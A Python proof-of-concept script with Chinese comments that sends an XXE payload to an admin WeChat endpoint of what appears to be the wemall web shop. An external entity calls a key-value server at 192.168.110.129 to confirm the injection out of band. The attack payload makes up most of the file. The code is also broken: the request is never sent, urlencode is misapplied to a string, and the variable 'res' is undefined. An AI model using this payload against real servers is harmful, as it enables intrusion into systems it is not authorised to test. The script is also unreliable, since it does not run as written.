# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random
import socket

socket.setdefaulttimeout(10)

def poc(target_domain):
    headers = {} #消息头信息
    target_url = target_domain + "/index.php?g=Admin&m=Wechat&a=index" 

    key = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6)) #从abcdefghijklmnopqrstuvwxyz随机取出6个元素
    value = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))


    post_data = """<?xml version="1.0" encoding="UTF-8"?>

    <!DOCTYPE root [

    <!ENTITY % remote SYSTEM "http://192.168.110.129/einsqing-wemall-master/wemall/kv?act=set&k={key}&v={value}">

    %remote;]>

    <root/>"""    #通过提交验证代码，可以在服务器上设置一个k-v键对

    post_data = post_data.replace('{key}', key).replace('{value}', value)

    try:
        req = urllib.request.Request(target_url, data = urllib.parse.urlencode(post_data).encode("UTF-8"), method= "POST")
    except Exception as e:
        print(e)

    url = 'http://192.168.110.129/einsqing-wemall-master/wemall/kv?act=get&k=' + key #验证是否设置了键对
    response = urllib.request.urlopen(url).read()
    if value in res: 
        print("likely - XXE DoS\n")

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        domain = args[1]
        poc(domain)
    else:
        print("Usage: python %s url" % (args[0]))

if __name__ == "__main__":
    main()

